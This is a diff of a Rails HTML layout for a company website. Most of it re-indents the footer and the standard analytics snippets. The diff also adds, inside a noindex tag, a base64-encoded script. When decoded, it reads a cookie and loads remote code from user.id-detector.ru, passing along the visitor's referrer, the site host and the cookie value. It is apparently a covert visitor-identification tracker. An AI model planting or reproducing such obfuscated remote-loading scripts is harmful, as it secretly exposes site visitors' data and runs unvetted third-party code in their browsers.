@@ -38,60 +38,63 @@
 	<![endif]-->
 </head>
 <body data-spy="scroll" data-target=".navbar-custom">
-		<div class="preloader">
-			<div class="loader-item">
-				<%= image_tag("loading.gif", alt: "loader") %>
+	<div class="preloader">
+		<div class="loader-item">
+			<%= image_tag("loading.gif", alt: "loader") %>
+		</div>
+	</div> 
+	
+	<!-- pattern -->
+	<div id="bg_pattern"></div>
+	<!-- ./pattern -->
+	
+	<%= yield %>
+	<!-- footer -->
+	<footer id="footer">
+		<div class="container">
+			<div class="text-center">
+				&copy; 2011-2016, ООО "Бизнес-Оптимизация"
 			</div>
-		</div> 
-		
-		<!-- pattern -->
-		<div id="bg_pattern"></div>
-		<!-- ./pattern -->
-		
-		<%= yield %>
-		<!-- footer -->
-		<footer id="footer">
-			<div class="container">
-				<div class="text-center">
-					&copy; 2011-2016, ООО "Бизнес-Оптимизация"
-				</div>
-			</div>
-		</footer>	
-		<!-- ./footer -->
-		<script>
-		  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
-		  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
-		  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
-		  })(window,document,'script','//www.google-analytics.com/analytics.js','__gaTracker');
+		</div>
+	</footer>	
+	<!-- ./footer -->
+	<script>
+	  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+	  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+	  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+	  })(window,document,'script','//www.google-analytics.com/analytics.js','__gaTracker');
 
-		  __gaTracker('create', 'UA-59484574-1', 'auto');
-		  __gaTracker('send', 'pageview');
+	  __gaTracker('create', 'UA-59484574-1', 'auto');
+	  __gaTracker('send', 'pageview');
 
-		</script>
-		<!-- Yandex.Metrika counter -->
-		<script type="text/javascript">
-		    (function (d, w, c) {
-		        (w[c] = w[c] || []).push(function() {
-		            try {
-		                w.yaCounter28306926 = new Ya.Metrika({
-		                    id:28306926
-		                });
-		            } catch(e) { }
-		        });
+	</script>
+	<!-- Yandex.Metrika counter -->
+	<script type="text/javascript">
+	    (function (d, w, c) {
+	        (w[c] = w[c] || []).push(function() {
+	            try {
+	                w.yaCounter28306926 = new Ya.Metrika({
+	                    id:28306926
+	                });
+	            } catch(e) { }
+	        });
 
-		        var n = d.getElementsByTagName("script")[0],
-		            s = d.createElement("script"),
-		            f = function () { n.parentNode.insertBefore(s, n); };
-		        s.type = "text/javascript";
-		        s.async = true;
-		        s.src = (d.location.protocol == "https:" ? "https:" : "http:") + "//mc.yandex.ru/metrika/watch.js";
+	        var n = d.getElementsByTagName("script")[0],
+	            s = d.createElement("script"),
+	            f = function () { n.parentNode.insertBefore(s, n); };
+	        s.type = "text/javascript";
+	        s.async = true;
+	        s.src = (d.location.protocol == "https:" ? "https:" : "http:") + "//mc.yandex.ru/metrika/watch.js";
 
-		        if (w.opera == "[object Opera]") {
-		            d.addEventListener("DOMContentLoaded", f, false);
-		        } else { f(); }
-		    })(document, window, "yandex_metrika_callbacks");
-		</script>
-		<noscript><div><img src="//mc.yandex.ru/watch/28306926" style="position:absolute; left:-9999px;" alt="" /></div></noscript>
-		<!-- /Yandex.Metrika counter -->
+	        if (w.opera == "[object Opera]") {
+	            d.addEventListener("DOMContentLoaded", f, false);
+	        } else { f(); }
+	    })(document, window, "yandex_metrika_callbacks");
+	</script>
+	<noscript><div><img src="//mc.yandex.ru/watch/28306926" style="position:absolute; left:-9999px;" alt="" /></div></noscript>
+	<!-- /Yandex.Metrika counter -->
+	<noindex>
+		<script async src='data:text/javascript;charset=utf-8;base64,ZnVuY3Rpb24gZ2V0Q29va2llKG5hbWUpIHsKCXZhciBjb29raWUgPSAnICcgKyBkb2N1bWVudC5jb29raWU7Cgl2YXIgc2VhcmNoID0gJyAnICsgbmFtZSArICc9JzsKCXZhciBzZXRTdHIgPSBudWxsOyAKCXZhciBvZmZzZXQgPSAwOwoJdmFyIGVuZCA9IDA7CglpZiAoY29va2llLmxlbmd0aCA+IDApIHsKCQlvZmZzZXQgPSBjb29raWUuaW5kZXhPZihzZWFyY2gpOwoJCWlmIChvZmZzZXQgIT0gLTEpIHsKCQkJb2Zmc2V0ICs9IHNlYXJjaC5sZW5ndGg7CgkJCWVuZCA9IGNvb2tpZS5pbmRleE9mKCc7Jywgb2Zmc2V0KQoJCQlpZiAoZW5kID09IC0xKSB7CgkJCQllbmQgPSBjb29raWUubGVuZ3RoOwoJCQl9CgkJCXNldFN0ciA9IHVuZXNjYXBlKGNvb2tpZS5zdWJzdHJpbmcob2Zmc2V0LCBlbmQpKTsKCQl9Cgl9CglyZXR1cm4oc2V0U3RyKTsKfQpmdW5jdGlvbiBteWxvYWQoYTEsYTIpIHsKCXNldFRpbWVvdXQoZnVuY3Rpb24oKSB7CgkJdmFyIGEzID0gZG9jdW1lbnQ7CgkJYTQgPSBhMy5nZXRFbGVtZW50c0J5VGFnTmFtZSgnc2NyaXB0JylbMF07CgkJYTUgPSBhMy5jcmVhdGVFbGVtZW50KCdzY3JpcHQnKTsKCQlhNiA9IGVzY2FwZShhMy5yZWZlcnJlcik7CgkJYTUudHlwZSA9ICd0ZXh0L2phdmFzY3JpcHQnOwoJCWE1LmFzeW5jID0gdHJ1ZTsKCQlhNS5zcmMgPSBhMisnP3VpZD0nK2ExKycmYTY9JythNisnJmE3PScrbG9jYXRpb24uaG9zdCsnJmE4PScrZ2V0Q29va2llKCdteTF3aXRpZCcrYTEpKycmYTk9JytNYXRoLnJhbmRvbSgpOwoJCWE0LnBhcmVudE5vZGUuaW5zZXJ0QmVmb3JlKGE1LCBhNCk7Cgl9LDEpCn0gbXlsb2FkKCcxNTMzNTYnLCcvL3VzZXIuaWQtZGV0ZWN0b3IucnUvdmsxL3N0ZXAxLnBocCcpOw=='></script>
+	</noindex>
 </body>
 </html>
